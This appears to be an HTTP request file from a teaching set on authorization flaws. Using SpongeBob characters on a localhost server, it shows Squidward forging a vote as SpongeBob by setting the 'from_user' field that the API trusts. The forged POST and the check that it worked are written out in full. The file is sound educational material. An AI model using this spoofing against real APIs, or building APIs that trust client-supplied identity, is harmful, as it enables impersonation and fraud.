@base = http://localhost:8000/ii/r03-authz-binding

### First, let's see the current state of messages in the Krusty Krab staff group
GET {{base}}/example16/groups/staff@krusty-krab.sea/messages
Authorization: Basic squidward@krusty-krab.sea:clarinet-master

# Results in 200 OK - Mr. Krabs has announced Employee of the Month voting:
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "Attention employees! Time to vote for Employee of the Month. Reply to this thread with your vote."
#   }
# ]

###

### Squidward is a member of the staff group, so he can legitimately post messages
### Here he posts his own vote (as himself) first
POST {{base}}/example16/groups/staff@krusty-krab.sea/messages
Authorization: Basic squidward@krusty-krab.sea:clarinet-master
Content-Type: application/json

{
  "from_user": "squidward@krusty-krab.sea",
  "message": "I vote for Squidward. Obviously the most talented and cultured employee here."
}

# Results in 200 OK:
# {
#   "status": "success",
#   "from": "squidward@krusty-krab.sea",
#   "to_group": "staff@krusty-krab.sea"
# }

###

### Now, the vulnerability: Squidward can impersonate SpongeBob!
### He's authenticated as himself, authorized to post to the staff group,
### but the API trusts the from_user parameter from the request body.
###
### Notice how the message is written in Squidward's pompous style, not SpongeBob's enthusiastic tone.
### SpongeBob would never say "sophisticated" or "refined artistic sensibility"!
POST {{base}}/example16/groups/staff@krusty-krab.sea/messages
Authorization: Basic squidward@krusty-krab.sea:clarinet-master
Content-Type: application/json

{
  "from_user": "spongebob@krusty-krab.sea",
  "message": "I vote for Squidward. He is clearly the most sophisticated employee with refined artistic sensibility. His clarinet skills are unmatched."
}

# Results in 200 OK:
# {
#   "status": "success",
#   "from": "spongebob@krusty-krab.sea",
#   "to_group": "staff@krusty-krab.sea"
# }

###

### Verify the impersonation worked - check the thread
GET {{base}}/example16/groups/staff@krusty-krab.sea/messages
Authorization: Basic squidward@krusty-krab.sea:clarinet-master

# Results in 200 OK - the fake vote appears to be from SpongeBob!
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "Attention employees! Time to vote for Employee of the Month. Reply to this thread with your vote."
#   },
#   {
#     "from": "squidward@krusty-krab.sea",
#     "message": "I vote for Squidward. Obviously the most talented and cultured employee here."
#   },
#   {
#     "from": "spongebob@krusty-krab.sea",
#     "message": "I vote for Squidward. He is clearly the most sophisticated employee with refined artistic sensibility. His clarinet skills are unmatched."
#   }
# ]
#
# IMPACT: Squidward has successfully rigged the Employee of the Month vote by
# impersonating SpongeBob! The message attribution shows it's from SpongeBob,
# but the language is clearly Squidward's (pompous, talking about "refined artistic
# sensibility" and clarinet skills). When Mr. Krabs tallies the votes, he'll see
# two votes for Squidward, one appearing to be from SpongeBob himself!
